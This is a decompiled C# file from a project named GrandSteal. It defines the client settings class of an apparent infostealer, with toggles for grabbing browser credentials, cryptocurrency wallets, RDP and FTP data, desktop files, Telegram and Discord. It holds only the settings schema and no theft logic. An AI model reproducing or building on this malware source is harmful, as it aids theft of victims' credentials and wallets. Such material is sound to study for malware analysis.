﻿using System;
using System.ComponentModel;
using ProtoBuf;

namespace GrandSteal.Client.Models
{
	// Token: 0x02000009 RID: 9
	[ProtoContract(Name = "ClientSettings")]
	public class ClientSettings : INotifyPropertyChanged
	{
		// Token: 0x17000001 RID: 1
		// (get) Token: 0x06000024 RID: 36 RVA: 0x0000206E File Offset: 0x0000026E
		// (set) Token: 0x06000025 RID: 37 RVA: 0x00002076 File Offset: 0x00000276
		[ProtoMember(1, Name = "GrabBrowserCredentials")]
		public bool GrabBrowserCredentials
		{
			get
			{
				return this._grabBrowserCredentials;
			}
			set
			{
				this._grabBrowserCredentials = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("GrabBrowserCredentials"));
			}
		}

		// Token: 0x17000002 RID: 2
		// (get) Token: 0x06000026 RID: 38 RVA: 0x0000209A File Offset: 0x0000029A
		// (set) Token: 0x06000027 RID: 39 RVA: 0x000020A2 File Offset: 0x000002A2
		[ProtoMember(2, Name = "GrabColdWallets")]
		public bool GrabColdWallets
		{
			get
			{
				return this._grabColdWallets;
			}
			set
			{
				this._grabColdWallets = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("GrabColdWallets"));
			}
		}

		// Token: 0x17000003 RID: 3
		// (get) Token: 0x06000028 RID: 40 RVA: 0x000020C6 File Offset: 0x000002C6
		// (set) Token: 0x06000029 RID: 41 RVA: 0x000020CE File Offset: 0x000002CE
		[ProtoMember(3, Name = "GrabRdp")]
		public bool GrabRdp
		{
			get
			{
				return this._grabRdp;
			}
			set
			{
				this._grabRdp = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("GrabRdp"));
			}
		}

		// Token: 0x17000004 RID: 4
		// (get) Token: 0x0600002A RID: 42 RVA: 0x000020F2 File Offset: 0x000002F2
		// (set) Token: 0x0600002B RID: 43 RVA: 0x000020FA File Offset: 0x000002FA
		[ProtoMember(4, Name = "GrabFtp")]
		public bool GrabFtp
		{
			get
			{
				return this._grabFtp;
			}
			set
			{
				this._grabFtp = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("GrabFtp"));
			}
		}

		// Token: 0x17000005 RID: 5
		// (get) Token: 0x0600002C RID: 44 RVA: 0x0000211E File Offset: 0x0000031E
		// (set) Token: 0x0600002D RID: 45 RVA: 0x00002126 File Offset: 0x00000326
		[ProtoMember(5, Name = "GrabDesktopFiles")]
		public bool GrabDesktopFiles
		{
			get
			{
				return this._grabDesktopFiles;
			}
			set
			{
				this._grabDesktopFiles = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("GrabDesktopFiles"));
			}
		}

		// Token: 0x17000006 RID: 6
		// (get) Token: 0x0600002E RID: 46 RVA: 0x0000214A File Offset: 0x0000034A
		// (set) Token: 0x0600002F RID: 47 RVA: 0x00002152 File Offset: 0x00000352
		[ProtoMember(6, Name = "DesktopExtensions")]
		public BindingList<string> DesktopExtensions
		{
			get
			{
				return this._desktopExtensions;
			}
			set
			{
				this._desktopExtensions = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("DesktopExtensions"));
			}
		}

		// Token: 0x17000007 RID: 7
		// (get) Token: 0x06000030 RID: 48 RVA: 0x00002176 File Offset: 0x00000376
		// (set) Token: 0x06000031 RID: 49 RVA: 0x0000217E File Offset: 0x0000037E
		[ProtoMember(7, Name = "GrabTelegram")]
		public bool GrabTelegram
		{
			get
			{
				return this._grabTelegram;
			}
			set
			{
				this._grabTelegram = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("GrabTelegram"));
			}
		}

		// Token: 0x17000008 RID: 8
		// (get) Token: 0x06000032 RID: 50 RVA: 0x000021A2 File Offset: 0x000003A2
		// (set) Token: 0x06000033 RID: 51 RVA: 0x000021AA File Offset: 0x000003AA
		[ProtoMember(8, Name = "GrabDiscord")]
		public bool GrabDiscord
		{
			get
			{
				return this._grabDiscord;
			}
			set
			{
				this._grabDiscord = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("GrabDiscord"));
			}
		}

		// Token: 0x14000001 RID: 1
		// (add) Token: 0x06000034 RID: 52 RVA: 0x00002F80 File Offset: 0x00001180
		// (remove) Token: 0x06000035 RID: 53 RVA: 0x00002FB8 File Offset: 0x000011B8
		public event PropertyChangedEventHandler PropertyChanged;

		// Token: 0x04000008 RID: 8
		private bool _grabBrowserCredentials;

		// Token: 0x04000009 RID: 9
		private bool _grabColdWallets;

		// Token: 0x0400000A RID: 10
		private bool _grabRdp;

		// Token: 0x0400000B RID: 11
		private bool _grabFtp;

		// Token: 0x0400000C RID: 12
		private bool _grabDesktopFiles;

		// Token: 0x0400000D RID: 13
		private bool _grabTelegram;

		// Token: 0x0400000E RID: 14
		private bool _grabDiscord;

		// Token: 0x0400000F RID: 15
		private BindingList<string> _desktopExtensions;
	}
}
